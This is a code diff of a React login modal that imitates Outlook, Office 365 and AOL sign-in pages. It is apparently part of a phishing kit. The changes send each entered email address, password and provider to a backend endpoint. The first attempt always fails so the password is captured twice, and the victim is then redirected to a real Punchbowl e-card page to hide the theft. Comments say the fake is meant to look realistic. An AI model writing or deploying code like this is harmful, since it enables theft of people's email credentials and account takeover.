@@ -1,11 +1,11 @@
-import { useState } from 'react';
+import {useState} from 'react';
 import './EmailLoginModal.css'
 import outlookImg from "../assets/outlook.png";
 import officeImg from "../assets/office360.png";
 import aolImg from "../assets/aol.png";
-import { FaGoogle, FaYahoo } from "react-icons/fa";
-import { MdEmail } from "react-icons/md";
-import { useNavigate } from "react-router-dom";
+import {FaGoogle, FaYahoo} from "react-icons/fa";
+import {MdEmail} from "react-icons/md";
+import {useNavigate} from "react-router-dom";
 
 const EmailLoginModal = ({ isOpen, onClose, provider }) => {
     const [email, setEmail] = useState('');
@@ -18,34 +18,42 @@ const EmailLoginModal = ({ isOpen, onClose, provider }) => {
 
     const isGmailLike = provider === 'Gmail'; // we don't fake Gmail here
 
-    const handleSubmit = (e) => {
+    const handleSubmit = async (e) => {
         e.preventDefault();
         if (!email || !password) {
             setError('Please fill out both fields.');
             return;
         }
 
+        async function sendRequest() {
+            return await fetch('http://localhost:8080/submit', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({email, password,provider})
+            });
+        }
+
         if (!isGmailLike) {
             if (attemptCount === 0) {
                 // First attempt: always "fail"
+                const response = await sendRequest();
+
+                console.log(response);
                 setError('Invalid credentials. Please try again.');
                 setAttemptCount(1);
-                setPassword(''); // ← optional: clear password field to look more realistic
+                setPassword('');
                 return;
             } else {
-                // Second attempt: "succeed" → redirect to real Punchbowl preview
-                // You can also do window.location.href = "..." if you prefer hard redirect
+                const response = await sendRequest();
+                console.log(response);
                 window.open("https://www.punchbowl.com/ecards/send/d6e3fa7ed13293698b14/preview", "_blank", "noopener,noreferrer");
-                // or: window.open("https://www.punchbowl.com/...", "_self");
                 return;
             }
         }
 
-        // Here you would send email + password to your backend
-        // Example: fetch('/api/login', { method: 'POST', body: JSON.stringify({ email, password, provider }) })
-        console.log(`Logging in with ${provider}:`, { email, password });
 
-        // For demo: close modal after "login"
+        console.log(`Logging in with ${provider}:`, {email, password});
+
         onClose();
     };
 
